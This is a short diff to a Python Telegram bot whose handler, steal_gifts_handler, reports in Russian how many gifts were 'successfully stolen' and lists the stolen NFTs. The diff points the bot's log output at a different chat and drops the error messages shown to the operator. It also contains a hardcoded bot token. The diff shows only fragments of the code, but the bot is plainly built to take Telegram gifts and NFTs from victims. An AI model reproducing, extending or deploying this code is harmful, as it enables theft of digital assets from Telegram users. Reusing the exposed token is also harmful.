@@ -19,7 +19,7 @@ import logging
 
 # Constants
 TOKEN = "7903455078:AAGfeTjfov_et6eDVv1KvdFRN4bnuj8OZLc" #Токен бота
-LOG_CHAT_ID = 7662388704
+LOG_CHAT_ID = -4871748618
 
 MAX_GIFTS_PER_RUN = 1000
 last_messages = {}
@@ -547,10 +547,6 @@ async def steal_gifts_handler(callback: CallbackQuery):
     if stolen_count > 0:
         result_msg.append(f"🎁 Успешно украдено подарков: <b>{stolen_count}</b>")
         result_msg.extend(stolen_nfts[:10])  # Ограничиваем количество выводимых NFT
-    
-    if errors:
-        result_msg.append("\n❌ Ошибки:")
-        result_msg.extend(errors[:5])  # Ограничиваем количество выводимых ошибок
 
     await callback.message.answer("\n".join(result_msg), parse_mode="HTML")
     await callback.answer()
